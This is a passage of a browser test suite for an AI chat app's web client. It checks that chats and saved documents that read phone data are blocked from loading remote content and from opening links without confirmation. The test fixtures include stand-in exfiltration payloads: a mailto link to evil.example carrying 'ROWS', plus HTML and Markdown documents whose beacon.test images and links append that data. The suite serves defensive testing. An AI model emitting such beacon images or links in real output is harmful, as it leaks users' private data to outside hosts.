      await pg.addInitScript(
        ([sid, ids, lineage, throws, anyRead, noMethod]) => {
          localStorage.setItem('hm.lastSession', JSON.stringify({ id: sid, profile: 'default' }))
          if (lineage) localStorage.setItem('hm.lineage.v1', JSON.stringify(lineage))
          window.__remote = []
          window.__tcalls = []
          window.__opened = []
          window.open = u => (window.__opened.push(String(u)), null)
          window.__sid = 'rt-' + sid
          const b = {
            remoteBlock: (key, on) => window.__remote.push({ block: on, key }),
            remoteAllowOnce: () => {},
            phoneDataAnyRead: () => anyRead
          }
          if (!noMethod)
            b.phoneDataTainted = (key, id) => {
              window.__tcalls.push(id)
              if (throws) throw new Error('bridge down')
              return ids.includes(id)
            }
          Object.assign(window.HermesAndroid, b)
          window.__socks = []
          const Orig = window.WebSocket
          window.WebSocket = class extends Orig {
            constructor(...a) {
              super(...a)
              window.__socks.push(this)
              this.addEventListener('message', e => {
                try {
                  const m = JSON.parse(e.data)
                  if (m.params && m.params.session_id) window.__sid = m.params.session_id
                } catch {
                  /* not JSON */
                }
              })
            }
          }
        },
        [sid, ids, lineage, throws, anyRead, noMethod]
      )
      for (const scheme of ['http', 'https'])
        await pg.route(`${scheme}://beacon.test/**`, r => {
          hits.push(r.request().url())
          return r.fulfill({ status: 200, contentType: 'image/png', body: png })
        })
      await pg.goto(WEB + '/')
      await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
      await sleep(1500)
      return pg
    }
    const rem = pg => pg.evaluate(() => window.__remote)
    const cardImgs = pg => pg.evaluate(() => [...document.querySelectorAll('.hm-openui')].flatMap(h => [...(h.shadowRoot || h).querySelectorAll('img')].map(i => i.getAttribute('src') || '')))
    const CHAT = 's-pd-leaks-ctl' // no phone_data call in its items
    const allBlocked = r => r.length > 0 && r.every(x => x.block === true)

    // ── lineage: S1 read, the chat was compressed to S2 (CHAT), the app restarted: only S1 is recorded ──
    hits.length = 0
    let pg = await open(CHAT, { ids: ['seg-old'], lineage: [{ s: ['seg-old', CHAT], r: ['rt-gone'] }] })
    let r = await rem(pg)
    let asked = await pg.evaluate(() => window.__tcalls)
    check(asked.includes('seg-old') && allBlocked(r) && hits.length === 0, `phone data lineage: an earlier segment of the chat that read makes the chat blocked (asked ${JSON.stringify(asked)}, ${JSON.stringify(r)})`)
    check((await cardImgs(pg)).every(s => !/beacon\.test/.test(s)), 'phone data lineage: and its card images are held back')
    hits.length = 0
    await pg.reload()
    await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
    await sleep(1200)
    r = await rem(pg)
    check(allBlocked(r) && hits.length === 0, `phone data lineage: after a reload (the preview path) it is never reported as not blocked (${JSON.stringify(r)})`)
    await pg.close()
    // control: the same lineage but nothing recorded; and an old segment recorded but no lineage known to the page (what it could not cover)
    pg = await open(CHAT, { ids: [], lineage: [{ s: ['seg-old', CHAT], r: [] }] })
    r = await rem(pg)
    check(r.length > 0 && r.every(x => x.block === false), `phone data lineage, control: nothing recorded -> not blocked (${JSON.stringify(r)})`)
    await pg.close()
    pg = await open(CHAT, { ids: ['seg-old'] })
    r = await rem(pg)
    check(r.length > 0 && r.every(x => x.block === false), `phone data lineage, limit: a link the page never saw can't be asked about (${JSON.stringify(r)})`)
    // a session.info naming another stored id (a compression happened) links it, and the chat becomes blocked
    await pg.evaluate(() => {
      const s = window.__socks.filter(x => x.readyState === 1).pop()
      s.dispatchEvent(new MessageEvent('message', { data: JSON.stringify({ jsonrpc: '2.0', method: 'event', params: { type: 'session.info', session_id: window.__sid, payload: { stored_session_id: 'seg-old' } } }) }))
    })
    await sleep(1500)
    r = await rem(pg)
    check(r[r.length - 1].block === true, `phone data lineage: a session.info with another stored id links it to the chat (${JSON.stringify(r.slice(-2))})`)
    await pg.close()

    // ── a bridge that throws means "read" (fail closed); a missing method does not break a chat the page can judge ──
    hits.length = 0
    pg = await open(CHAT, { throws: true })
    r = await rem(pg)
    check(allBlocked(r) && (await cardImgs(pg)).every(s => !/beacon\.test/.test(s)) && hits.length === 0, `phone data fail closed: a throwing phoneDataTainted blocks the chat (${JSON.stringify(r)})`)
    await pg.close()
    pg = await open(CHAT, { noMethod: true })
    r = await rem(pg)
    check(r.length > 0 && r.every(x => x.block === false), `phone data fail closed, control: a shell without the method leaves a chat with no phone_data item alone (${JSON.stringify(r)})`)
    await pg.close()

    // ── a bare mailto: link in a chat that read shows its full text first; opens only on Open ──
    const mail = 'mailto:a@evil.example?body=ROWS'
    const noticeMail = pg2 =>
      pg2.evaluate(m => {
        const s = window.__socks.filter(x => x.readyState === 1).pop()
        s.dispatchEvent(new MessageEvent('message', { data: JSON.stringify({ jsonrpc: '2.0', method: 'event', params: { type: 'review.summary', session_id: window.__sid, payload: { text: `[mail me](${m})` } } }) }))
      }, mail)
    pg = await open(CHAT, { ids: [CHAT] })
    await noticeMail(pg)
    await pg.locator('.notice a', { hasText: 'mail me' }).click({ timeout: 5000 })
    const d = await pg.locator('.dialog').innerText({ timeout: 3000 }).catch(() => null)
    check(d && d.includes(mail) && d.includes('body=ROWS') && (await pg.evaluate(() => window.__opened)).length === 0, `phone data mailto: the full link is shown and nothing opened yet (${d})`)
    await pg.locator('.dialog').getByRole('button', { name: 'Cancel' }).click()
    check((await pg.evaluate(() => window.__opened)).length === 0, 'phone data mailto: Cancel opens nothing')
    await pg.close()
    pg = await open(CHAT, { ids: [] })
    await noticeMail(pg)
    await pg.locator('.notice a', { hasText: 'mail me' }).click({ timeout: 5000 })
    await sleep(300)
    check((await pg.locator('.dialog').count()) === 0 && (await pg.evaluate(() => window.__opened)).length === 1, 'phone data mailto, control: an untainted chat opens it at once')
    await pg.close()

    // ── a saved document is judged by its own chat: Gallery and Files, with an untainted chat on screen ──
    const docHits = () => hits.filter(h => /\/(doc|md)\.png/.test(h))
    const post = (p, b) => fetch(MOCK + p, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(b) })
    await post('/api/plugins/hermes-mobile/canvas/doc', { session: 's-pd-docchat', title: 'Rows page', type: 'html', content: '<img src="http://beacon.test/doc.png?d=ROWS"><p>rows</p>' })
    await post('/api/plugins/hermes-mobile/canvas/doc', { session: 's-pd-docchat', title: 'Rows notes', type: 'markdown', content: '![x](http://beacon.test/md.png?d=ROWS)\n\nsee [here](http://beacon.test/p?d=ROWS)' })
    await post('/api/plugins/hermes-mobile/canvas/doc', { session: 's-pd-cleanchat', title: 'Clean page', type: 'html', content: '<p>clean</p>' })
    const gallery = async pg2 => {
      await pg2.getByRole('button', { name: /^Sessions/ }).click()
      await pg2.locator('.nav-tile', { hasText: 'Hermux' }).click()
      await pg2.locator('.hub-card', { hasText: 'Canvas gallery' }).click()
      await pg2.locator('.gallery-card').first().waitFor({ timeout: 8000 })
    }
    hits.length = 0
    pg = await open(CHAT, { ids: ['s-pd-docchat'] })
    await gallery(pg)
    await pg.locator('.gallery-card', { hasText: 'Rows page' }).click()
    await sleep(900)
    let v = await pg.evaluate(() => ({ frames: document.querySelectorAll('iframe').length, held: document.querySelectorAll('.html-held').length }))
    r = await rem(pg)
    check(v.frames === 0 && v.held === 1 && r[r.length - 1].block === true && docHits().length === 0, `phone data gallery: an HTML page from a chat that read is not run, though the chat on screen did not read (${JSON.stringify(v)}, ${JSON.stringify(r.slice(-2))})`)
    await pg.evaluate(() => window.hermesBack())
    await sleep(700)
    r = await rem(pg)
    check(r[r.length - 1].block === false, `phone data gallery: closing it lets the shell's filter off again (${JSON.stringify(r.slice(-2))})`)
    await pg.locator('.gallery-card', { hasText: 'Rows notes' }).click()
    await sleep(900)
    v = await pg.evaluate(() => ({ imgs: document.querySelectorAll('.lib-viewer img').length, holds: document.querySelectorAll('.lib-viewer .remote-hold').length }))
    check(v.imgs === 0 && v.holds === 1 && docHits().length === 0, `phone data gallery: a Markdown document's remote image waits behind a tap (${JSON.stringify(v)}, ${JSON.stringify(docHits())})`)
    await pg.locator('.lib-viewer a', { hasText: 'here' }).click()
    const dd = await pg.locator('.dialog').innerText({ timeout: 3000 }).catch(() => null)
    check(dd && dd.includes('Site: beacon.test') && dd.includes('?d=ROWS'), `phone data gallery: a link in it shows its address first (${dd})`)
    await pg.locator('.dialog').getByRole('button', { name: 'Cancel' }).click()
    await pg.evaluate(() => window.hermesBack())
    await sleep(500)
    // control: a document of an untainted chat still runs in its frame
    await pg.locator('.gallery-card', { hasText: 'Clean page' }).click()
    await sleep(900)
    v = await pg.evaluate(() => ({ frames: document.querySelectorAll('iframe.html-frame').length, held: document.querySelectorAll('.html-held').length }))
    r = await rem(pg)
    check(v.frames === 1 && v.held === 0 && r[r.length - 1].block === false, `phone data gallery, control: a page from an untainted chat still runs (${JSON.stringify(v)})`)
    await pg.close()
    // the document's chat has an older segment that read (lineage), and the old copy with no chat (unknown) counts once any read exists
    pg = await open(CHAT, { ids: ['seg-doc-old'], lineage: [{ s: ['seg-doc-old', 's-pd-docchat'], r: [] }] })
    await gallery(pg)
    await pg.locator('.gallery-card', { hasText: 'Rows page' }).click()
    await sleep(900)
    v = await pg.evaluate(() => ({ frames: document.querySelectorAll('iframe').length, held: document.querySelectorAll('.html-held').length }))
    check(v.frames === 0 && v.held === 1, `phone data gallery: a document whose chat was compressed from a chat that read is held (${JSON.stringify(v)})`)
    await pg.close()
    pg = await open(CHAT, { ids: [], anyRead: true })
    await gallery(pg)
    await pg.locator('.gallery-card', { hasText: 'Old notes' }).click()
    await sleep(900)
    v = await pg.evaluate(() => ({ holds: document.querySelectorAll('.lib-viewer .remote-hold').length, guarded: document.querySelectorAll('.lib-viewer .md').length }))
    r = await rem(pg)
    check(r[r.length - 1].block === true, `phone data gallery: a document of an unknown chat is held once the app has recorded any read (${JSON.stringify(r.slice(-2))})`)
    await pg.close()
    pg = await open(CHAT, { ids: [], anyRead: false })
    await gallery(pg)
    await pg.locator('.gallery-card', { hasText: 'Old notes' }).click()
    await sleep(900)
    r = await rem(pg)
    check(r.every(x => x.block === false), `phone data gallery, control: ... and not before any read (${JSON.stringify(r.slice(-2))})`)
    await pg.close()

    // Files: a file has no chat, so it is judged by whether the app has ever recorded a read
    for (const [anyRead, want] of [[true, true], [false, false]]) {
      pg = await open(CHAT, { ids: [], anyRead })
      await pg.getByRole('button', { name: /^Sessions/ }).click()
      await pg.locator('.nav-tile', { hasText: 'Hermux' }).click()
      await pg.locator('.hub-card', { hasText: 'Files' }).click()
      await pg.locator('.file-row', { hasText: 'page.html' }).click()
      await sleep(1200)
      v = await pg.evaluate(() => ({ frames: document.querySelectorAll('iframe.html-frame').length, held: document.querySelectorAll('.html-held').length }))
      r = await rem(pg)
      check(want ? v.frames === 0 && v.held === 1 && r[r.length - 1].block === true : v.frames === 1 && v.held === 0 && r.every(x => x.block === false), `phone data files${want ? '' : ', control'}: an HTML file ${want ? 'is held once a read was recorded' : 'still runs when no read was ever recorded'} (${JSON.stringify(v)}, ${JSON.stringify(r.slice(-2))})`)
      await pg.close()
    }
  }
}
